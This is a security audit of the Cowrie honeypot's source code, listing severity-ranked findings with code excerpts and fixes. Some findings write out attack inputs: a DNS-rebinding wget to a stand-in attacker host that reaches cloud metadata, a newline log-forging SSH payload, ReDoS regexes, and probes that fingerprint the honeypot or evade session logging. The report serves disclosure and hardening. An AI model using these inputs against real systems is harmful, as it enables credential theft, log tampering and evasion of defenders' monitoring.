# Cowrie SSH/Telnet Honeypot — Security Analysis
**Target:** https://github.com/cowrie/cowrie  
**Date:** 2026-08-25  
**Status:** Complete  
**Method:** Static source analysis across 5 parallel lanes — injection/auth/crypto, logic/config/SFTP, command emulation, state machine/DoS, SSH protocol

---

## Severity Summary

| Sev | Count | Categories |
|-----|-------|------------|
| HIGH | 8 | Detection fingerprints, DoS, SSRF, output data loss |
| MED | 10 | Log injection, ReDoS, SSRF, reactor abuse, credential exposure |
| LOW | 12 | FD leaks, race conditions, pickle RCE, log evasion |

---

## HIGH Findings

---

### H1 — Stale SSH Version String (Fingerprint)
**File:** `src/cowrie/ssh/factory.py:44`  
**Category:** Honeypot detection

```python
ourVersionString: bytes = CowrieConfig.get(
    "ssh", "version", fallback="SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2"
).encode("ascii")
```

OpenSSH 6.0p1 was released April 2012. No production server runs a 14-year-old SSH daemon. Any scanner with a version table fingerprints this on first connection before any auth attempt.

**Fix:** Change fallback to `SSH-2.0-OpenSSH_9.7` or require operators to set it explicitly with no fallback.

---

### H2 — KEXINIT Null Padding (Protocol Fingerprint)
**File:** `src/cowrie/ssh/transport.py:229-233`  
**Category:** Honeypot detection

```python
if messageType == transport.MSG_KEXINIT:
    padding = b"\0" * lenPad
else:
    padding = randbytes.secureRandom(lenPad)
```

Real OpenSSH pads all packets with random bytes. Cowrie uses null bytes specifically for KEXINIT — a known telltale documented in public Cowrie fingerprinting research. Passive packet capture before auth completes identifies Cowrie with high confidence.

**Fix:** Use `randbytes.secureRandom(lenPad)` for all packet types uniformly.

---

### H3 — Cipher List Mismatch (HASSH Fingerprint)
**File:** `src/cowrie/ssh/factory.py:144-154`  
**Category:** Honeypot detection

```python
t.supportedCiphers = [
    b"aes128-ctr", b"aes192-ctr", b"aes256-ctr",
    b"aes256-cbc", b"aes192-cbc", b"aes128-cbc",
    b"3des-cbc", b"blowfish-cbc", b"cast128-cbc",
]
```

`blowfish-cbc` removed from OpenSSH in 6.7 (2014). `cast128-cbc` and `3des-cbc` disabled by default in all modern builds. The KEXINIT capability set maps directly to Cowrie's known HASSH profile in public fingerprint databases.

**Fix:** Match cipher/MAC/kex lists to the declared version string's real defaults. Lock them together or derive dynamically from the configured version.

---

### H4 — Output Plugin Silent Data Loss (MySQL / PostgreSQL)
**Files:** `src/cowrie/output/mysql.py:89-93`, `src/cowrie/output/postgresql.py:76-79`  
**Category:** Reliability / logging integrity

```python
except Exception as e:
    self._log.info(
        "output_mysql: Error connecting to database: {error!r}", error=e
    )
# self.db is never set; plugin continues running
```

If `start()` throws (DB unreachable, wrong credentials), `self.db` is never assigned. Plugin does not stop itself. Every subsequent `write()` call raises `AttributeError: 'Output' object has no attribute 'db'`, silently caught by the output pipeline. Honeypot keeps running. All credential and command data is silently dropped to that sink. Operator sees one log line at startup, nothing else.

**Fix:** Re-raise the exception from `start()`, or guard all `write()` calls with `if not hasattr(self, 'db'): return` and fire a persistent alarm. Use `_log.failure()` not `_log.info()` for exceptions.

---

### H5 — DNS Rebinding SSRF (wget / curl)
**Files:** `src/cowrie/commands/wget.py:272,324,378`, `src/cowrie/commands/curl.py:321,352`  
**Category:** SSRF

`communication_allowed()` resolves and validates the hostname, but then passes the original URL string to treq which performs its own independent DNS resolution at connect time. Two separate DNS lookups — first passes blocklist, second hits internal target.

```python
# wget.py — checks DNS
allowed = yield communication_allowed(self.host)
...
# treq re-resolves self.host independently at connect time
return fetch(reactor, url, headers=headers, timeout=10)
```

`nc.py` and `tftp.py` are correctly implemented — they call `resolve_allowed(host)` and connect to the returned IP directly. wget/curl do not follow this pattern.

**Exploit:** Attacker controls DNS server. Set TTL=1s. First resolve → `8.8.8.8` (passes blocklist). Second resolve (treq internal) → `169.254.169.254` (AWS metadata). `wget http://rebind.attacker.com/` → real request to AWS metadata endpoint, response returned to attacker.

**Fix:** Mirror `nc.py`'s pattern — call `resolve_allowed(self.host)`, reconstruct URL with the returned IP, pass that to treq. Never let treq re-resolve the hostname.

---

### H6 — Unbounded Pre-Banner TCP Buffer (Memory DoS)
**File:** `src/cowrie/ssh/transport.py:151`  
**Category:** DoS

```python
self.buf = self.buf + data
if not self.gotVersion:
    if b"\n" not in self.buf:
        return
```

Until `\n` arrives, every `dataReceived` call appends to `self.buf` with no cap. Send TCP segments without `\n` for the 120s auth timeout duration. At 10 MB/s = 1.2 GB/connection before timeout fires. No `MAX_BUF` constant exists anywhere in `transport.py`. 100 concurrent connections = ~120 GB potential allocation.

**Fix:** Add `if len(self.buf) > MAX_BANNER_SIZE: self.transport.loseConnection(); return` where `MAX_BANNER_SIZE` = 8192 bytes.

---

### H7 — Unbounded Interactive Line Buffer (Memory DoS)
**File:** `src/cowrie/shell/protocol.py:522-525`  
**Category:** DoS

```python
self.lineBuffer.insert(self.lineBufferIndex, ch)
self.lineBufferIndex += 1
```

`max_input_size` guard in `honeypot.py:272` only runs at RETURN. An attacker streaming bytes in an interactive session without pressing RETURN grows `lineBuffer` unbounded for the 180s idle timeout duration. ~10 MB/session at typical SSH throughput. Repeatable across many concurrent sessions.

**Fix:** Add a length check in `characterReceived` before appending: `if len(self.lineBuffer) >= MAX_INPUT_SIZE: return`.

---

### H8 — No Connection Limit in SSH Factory (Connection DoS)
**File:** `src/cowrie/ssh/factory.py:109-181`  
**Category:** DoS

```python
def buildProtocol(self, addr):
    t = shellTransport.HoneyPotSSHTransport()
    ...
    return t
```

No `maxConnections`, no `connectionLimitReached`, no rate limiting at TCP accept layer. Real OpenSSH has `MaxStartups 10:30:100`. Cowrie accepts every connection unconditionally. 10,000 simultaneous connections: 10,000 timeout timers, 10,000 buffer allocations, 10,000 state objects. Ceiling is OS FD limit only.

**Fix:** Implement a connection counter in the factory; call `transport.loseConnection()` immediately in `buildProtocol` when over threshold.

---

## MEDIUM Findings

---

### M1 — Log Injection via Command Input (textlog plain format)
**Files:** `src/cowrie/shell/honeypot.py:251`, `src/cowrie/output/textlog.py:40`  
**Category:** Log injection / SIEM poisoning

```python
# honeypot.py:251
self.protocol.events.dispatch("cowrie.command.input", "CMD: %(input)s", input=line)

# textlog.py:40
self.outfile.write("{}\n".format(event["message"]))
```

`line` is decoded attacker SSH exec payload. No newline sanitization. Embedded `\n` in exec payload produces multiple lines in the textlog. Attacker can forge arbitrary past events with chosen timestamps, session IDs, and credentials. CEF format is safe (`cef.py` escapes `\n`). Default plain format is not.

**Exploit:** `ssh honeypot 'id\n2024-01-01T12:00:00 aAbBcCdD cowrie.login.success src_ip=8.8.8.8 username=root password=toor'`

**Fix:** Apply `escape_nonprintable()` (already exists in `core/utils.py:19`) to `line` before dispatch in `honeypot.py:251`.

---

### M2 — ReDoS in awk.py (Attacker-Controlled Regex)
**File:** `src/cowrie/commands/awk.py:92,132`  
**Category:** ReDoS / reactor block

```python
# Attacker-supplied regex extracted and compiled
return bool(re.match(c["regex"], inputline))
```

Cowrie is single-threaded Twisted. A blocking `re.match()` blocks ALL sessions. `awk '/(a+)+$/ { print }' /etc/passwd` — catastrophic backtracking on each line of the file.

**Exploit:** `echo "aaaaaaaaaaaaaaaaaaaaaaaab" | awk '/(a*)*b/ { print }'` — worst-case backtracking, seconds of CPU per line.

**Fix:** Python 3.11+ timeout parameter on `re.match()`, or `re2` library for linear-time matching.

---

### M3 — SSRF IPv6 Cloud Metadata Gap
**Files:** `src/cowrie/core/network.py:24-40`, `src/cowrie/commands/curl.py:321`  
**Category:** SSRF

`BLOCKED_IPS` covers RFC-1918 and common cloud IPv4 metadata. AWS IPv6 metadata endpoint `fd00:ec2::254` (ULA range) and other cloud-provider IPv6 metadata addresses are not explicitly blocked. `_is_global()` returns False for ULA (blocked), but custom cloud setups vary.

**Fix:** Explicitly enumerate all cloud metadata IPv6 ranges in `BLOCKED_IPS`. Do not rely solely on `is_global()` classification.

---

### M4 — sleep: Orphaned DelayedCall Reactor Leak + Session Evasion
**File:** `src/cowrie/commands/sleep.py:111,114`  
**Category:** Reactor abuse / evasion

```python
_time += int(m.group(1))   # no cap
self.scheduled = reactor.callLater(_time, self.done)
```

`sleep 99999999999999999` schedules a callback ~31 trillion years out. `connectionLost` does not cancel `self.scheduled`. Disconnect without CTRL-C — `DelayedCall` leaks in reactor heap indefinitely. Repeat 10,000 times → reactor heap bloat, O(log n) insert cost per new `callLater`.

Secondary: session with active sleep generates no commands to log. Attacker gets a live session with minimal log footprint.

**Fix:** Cap `_time` to a sane maximum (e.g., 3600s). Cancel `self.scheduled` in `connectionLost`.

---

### M5 — ping: 2^31 callLater Chain (Session Pin + Reactor Abuse)
**File:** `src/cowrie/commands/ping.py:57-58,108`  
**Category:** Reactor abuse

```python
self.max = int(opt[1])   # no upper bound
self.scheduled = reactor.callLater(1, self.showreply)
```

`ping -c 2147483647` chains 1-second callbacks for ~68 years. Session pinned to cmdstack, `self.exit()` never called, session held open consuming reactor scheduling bandwidth.

**Fix:** Cap `-c` argument to a reasonable maximum (e.g., 100). Cancel `self.scheduled` in `connectionLost`.

---

### M6 — AuthRandom tried List Unbounded + Blocking I/O Per Attempt
**File:** `src/cowrie/core/auth.py:277,194`  
**Category:** Memory / disk DoS

```python
self.uservar[src_ip]["tried"].append(userpass)
...
with open(self.uservar_file, "w", encoding="utf-8") as fp:
    json.dump(data, fp)
```

No cap on `tried` list. No pruning. JSON file rewritten synchronously on every auth attempt (blocking I/O on Twisted reactor thread). High-rate auth scanning bloats in-memory dict and rewrites entire JSON file per attempt. At botnet scale with spoofed IPs: one dict key per source IP, never evicted.

**Fix:** Cap `tried` list per IP (e.g., last 50 entries). Move I/O to a thread pool (`deferToThread`) or switch to SQLite.

---

### M7 — Auth Behavioral Fingerprint (AuthRandom Policy)
**File:** `src/cowrie/core/auth.py:156-163,237`  
**Category:** Honeypot detection

```python
self.mintry = 2
self.maxtry = 5
ipinfo["max"] = randint(self.mintry, self.maxtry)
```

AuthRandom rejects all credentials from a new IP for 2-5 attempts before allowing login. A bot probing the same credential twice from the same IP and succeeding on the second attempt confirms it is talking to a honeypot. Real SSH servers fail bad credentials immediately with no retry escalation.

**Fix:** Use fixed-credential mode (`userdb.txt`) for production. If using AuthRandom, tighten range or set `mintry=1`.

---

### M8 — SFTP Real File Served via honeyfs contents_path
**Files:** `src/cowrie/shell/fs.py:318-319`, `src/cowrie/shell/honeyfs.py:123-142`  
**Category:** Data exposure

```python
if f[A_TYPE] == T_FILE and f[A_REALFILE]:
    return Path(f[A_REALFILE]).read_bytes()
```

When `contents_path` is set, `init_honeyfs()` maps virtual FS paths to real host paths via `A_REALFILE`. An SFTP client reading `/etc/passwd` in the virtual FS gets the real host `/etc/passwd` if `contents_path` contains a matching file. This is by design but broader than operators may realize — any file under `contents_path` that exists in the virtual tree exposes real disk bytes via SFTP.

**Fix:** Document explicitly. Consider a separate `sftp_readable_path` config distinct from `contents_path`.

---

### M9 — Credential Cleartext in World-Readable State File
**File:** `src/cowrie/core/auth.py:188-195`  
**Category:** Credential exposure

```python
def savevars(self) -> None:
    data = self.uservar  # contains "user" and "pw" in cleartext
    with open(self.uservar_file, "w", encoding="utf-8") as fp:
        json.dump(data, fp)  # no chmod — inherits process umask
```

`auth_random.json` contains cleartext credentials from every successful login. Written with no explicit permissions — inherits process umask, commonly world-readable. If honeypot host is compromised, attacker reads the credential dump.

**Fix:** `os.chmod(self.uservar_file, 0o600)` after write. Consider hashing stored credentials — equality check doesn't require plaintext.

---

### M10 — SFTP Executable Bit Stripping Bug (Decimal vs Octal)
**File:** `src/cowrie/shell/fs.py:483`  
**Category:** Logic error

```python
hostmode: int = mode & ~(111)   # BUG: 111 decimal, not octal 0o111
```

Intent: strip executable bits (`0o111` = `0b001001001`). Actual: `111` decimal = `0x6F` = `0b01101111`. Wrong bits stripped. For `mode=0o755`: intended result `0o644`, actual result `0o600`. SFTP-uploaded files land on real host with incorrect permissions.

**Fix:** `mode & ~(0o111)`

---

## LOW Findings

---

### L1 — abuseipdb.py Pickle Deserialization
**File:** `src/cowrie/output/abuseipdb.py:62-63`

```python
with open(self.state_dump, "rb") as f:
    self.logbook.update(pickle.load(f))
```

If attacker gains write access to the state dir (via any path — misconfigured `download_path`, another traversal, post-compromise), replacing `aipdb.dump` with a malicious pickle gives RCE on next Cowrie restart.

**Fix:** Replace with `json` serialization. `LogBook` state is a plain dict — trivially representable as JSON.

---

### L2 — AuthRandom JSON Race Condition (TOCTOU)
**File:** `src/cowrie/core/auth.py:188-195` *(comment at line 193: "this is subject to races between cowrie logins")*

Two concurrent logins from different IPs: both `loadvars()`, both modify `self.uservar`, both `savevars()`. Last writer wins — drops a credential entry from the log. Self-documented bug never fixed.

**Fix:** `fcntl.flock()` around read-modify-write, or class-level singleton for `AuthRandom` state.

---

### L3 — UserDB Regex ReDoS (Operator Misconfiguration Risk)
**File:** `src/cowrie/core/auth.py:101-115`

`userdb.txt` supports `/pattern/` regex rules applied to attacker-controlled password bytes. Catastrophically backtracking pattern + crafted password → blocks Twisted reactor for seconds. All active sessions affected.

**Fix:** Python 3.11+ `re.match(pattern, data, timeout=0.1)` or `re2` library. Document risk in userdb.txt format docs.

---

### L4 — dd.py Unhandled ValueError → Session Orphan
**File:** `src/cowrie/commands/dd.py:64`

```python
c = int(self.ddargs["count"])   # no try/except
```

`dd if=/etc/passwd count=abc` → `ValueError`, propagates through `start()`, command never calls `exit()`, shell never resumes. Session orphaned until 180s idle timeout.

**Fix:** Wrap in try/except, write error to `errorWrite()`.

---

### L5 — `yes` Reactor Saturation (No Iteration Cap)
**File:** `src/cowrie/commands/base.py:984`

```python
self.scheduled = reactor.callLater(0.01, self.y)
```

No cap. 100 callbacks/second per session. 180s idle timeout → 18,000 scheduled callbacks per session. Multiple concurrent sessions compound.

**Fix:** Add iteration counter, call `self.exit()` after max iterations.

---

### L6 — Session Evasion via Pre-Auth Channel Message
**File:** `src/cowrie/ssh/connection.py:28-36` + `ssh/transport.py`

Send `MSG_CHANNEL_OPEN` (90) before completing auth (before `MSG_SERVICE_REQUEST` for `ssh-connection`). `self.service` is the auth service or `None`. `dispatchMessage` catches `struct.error` but not `AttributeError`. Connection closes without Cowrie's session logging. **Clean evasion — no session record produced.**

**Trigger:** SSH KEXINIT → send MSG_CHANNEL_OPEN (90) immediately before service request.

**Fix:** Gate service-layer messages in `dispatchMessage` with null service check; log and close cleanly.

---

### L7 — Telnet IAC Duplicate Suppression (Log Evasion)
**File:** `src/cowrie/telnet/transport.py:291-295`

Duplicate IAC option bytes silently suppressed after first occurrence. Attacker sends same option twice — second negotiation event not logged.

---

### L8 — textlog File Descriptor Leak
**File:** `src/cowrie/output/textlog.py:27-28`

```python
def stop(self):
    pass
```

`start()` opens `self.outfile`. `stop()` never closes it. Unwritten buffered data lost on crash.

**Fix:** `stop()` should call `self.outfile.flush(); self.outfile.close()`.

---

### L9 — historyLines Unbounded Memory Growth
**File:** `src/cowrie/shell/protocol.py:533`

```python
self.historyLines.append(b"".join(self.lineBuffer))
```

No eviction. 10,000 × 16 KB commands → 160 MB in history list. No cap.

**Fix:** Bound to last N entries (e.g., 1000).

---

### L10 — slackclient 2.9.4 (EOL Dependency)
**File:** `requirements-output.txt:36`

```
slackclient==2.9.4
```

Deprecated in 2020, no security patches. Slack output plugin receives captured attacker credentials — credential interception in the HTTP stack is high impact.

**Fix:** Replace with `slack-sdk>=3`, update `src/cowrie/output/slack.py` to use `WebClient`.

---

## Verified NOT Vulnerable

- **Shell injection to real OS:** Zero `subprocess`, `os.system`, `os.popen`, `os.exec*` in the command dispatch path. `getCommand()` returns Python classes only.
- **File write to real FS via tee/dd:** `tee.py` only updates virtual FS metadata. `dd` ignores `of=` entirely. Real-FS writes go through `pipe.py` which generates cowrie-controlled temp paths.
- **SFTP path traversal:** `_absPath` uses `posixpath.abspath(join(home, path))` — canonicalizes `../` sequences correctly.
- **SQL injection:** All three DB backends (MySQL, SQLite, PostgreSQL) use parameterized queries throughout.
- **Fake chroot escape:** `mkfile()` checks `SPECIAL_PATHS`; writes go to `download_path` only.
- **CEF/syslog log injection:** `escapeCefValue` correctly escapes `\n`, `\r`, `=`, `\\`.

---

## SSH Protocol Findings (Lane 5)

---

### S1 — diffie-hellman-group14-sha1 Always Advertised (Not Configurable)
**Severity: MED**  
**File:** `src/cowrie/ssh/factory.py:128-136`

`factory.py` strips `group-exchange-sha1` and `group-exchange-sha256` when no moduli file is present, but `diffie-hellman-group14-sha1` is never removed and has no config key. SHA-1 KEX deprecated by NIST 2015, mandated removed by RFC 8270. Always present in KEXINIT.

**Fix:** Add `[ssh] kex` config key; default list should exclude all SHA-1 KEX variants.

---

### S2 — SSH Private Key Written World-Readable
**Severity: MED**  
**File:** `src/cowrie/ssh/keys.py:61-64`

```python
with open(privateKeyFile, "w+b") as f:   # no explicit permission bits
    f.write(privateKeyString)
```

Private key written with default umask — commonly `0o644` (world-readable) on many Linux distros.

**Fix:** Use `os.open(path, os.O_WRONLY|os.O_CREAT, 0o600)` before writing.

---

### S3 — forward_tunnel Enables Real Outbound TCP from Honeypot
**Severity: HIGH (when misconfigured)**  
**File:** `src/cowrie/ssh/forwarding.py:72-102`

`TCPTunnelForwardingChannel` creates a real TCP connection to a configured proxy and forwards attacker data through it. If misconfigured to point at an internal service, attacker relays traffic to internal targets through the honeypot host. Tunnel response parsing at line 301 does `data.split(b" ")[1]` with `except ValueError` — does not catch `IndexError` on a malformed proxy response with no spaces.

**Fix:** Validate proxy response before parsing. Add `except (ValueError, IndexError)`.

---

### S4 — Shell Channel Sends Success Before Request Resolves
**Severity: LOW**  
**File:** `src/cowrie/ssh/connection.py:40-45`

```python
if requestType == b"shell":
    wantReply = 0
    self.transport.sendPacket(connection.MSG_CHANNEL_SUCCESS, ...)
d = defer.maybeDeferred(...)   # runs after success already sent
```

Client receives `MSG_CHANNEL_SUCCESS` before the shell is established. If `requestReceived` fails, client has already gotten a success response. Session state inconsistency.

---

### S5 — NEW-ENVIRON Acceptance (Telnet Detection Signal)
**Severity: MED (detection)**  
**File:** `src/cowrie/telnet/transport.py:362`

Cowrie accepts Telnet `NEW-ENVIRON` (option 39) from clients. No real minimalist telnetd accepts this by default. Scanner enumerating accepted options identifies Cowrie.

---

### S6 — Connection Fingerprint Conjunction
**Severity: HIGH (detection)**  
**Files:** Multiple

The combination is sufficient for definitive Cowrie identification with no auth required:

| Signal | Value |
|--------|-------|
| Version string | `SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2` |
| KEXINIT padding | All zeros (not random) |
| Cipher list | Includes `blowfish-cbc`, `cast128-cbc`, `3des-cbc` (removed from OpenSSH 6.7+) |
| KEX order | Modern `curve25519-sha256` first + legacy `group14-sha1` last (no real install matches) |
| No `SSH_MSG_DISCONNECT` on bad packet length | Silent drop |
| Shell success timing | Sent before shell established |

Vetterl-style 2-probe ID: (1) send KEX with only `diffie-hellman-group14-sha1` — real modern OpenSSH rejects, Cowrie accepts; (2) send malformed packet length — real OpenSSH sends `SSH_MSG_DISCONNECT`, Cowrie silently drops. Definitive identification before any credentials exchanged.

---

### S7 — TTY Log: Two-Write Non-Atomicity + Hash Truncation Silent
**Severity: LOW**  
**File:** `src/cowrie/core/ttylog.py:44-47,85`

```python
f.write(struct.pack(TTYSTRUCT, ...))   # header
f.write(data)                           # data — separate write
```

Header and payload in two separate `write()` calls — not atomic. `ttylog_inputhash()` reopens and reads the file; partial record causes `struct.unpack` to hit `except struct.error: break`, computing hash over truncated input with no warning.

---

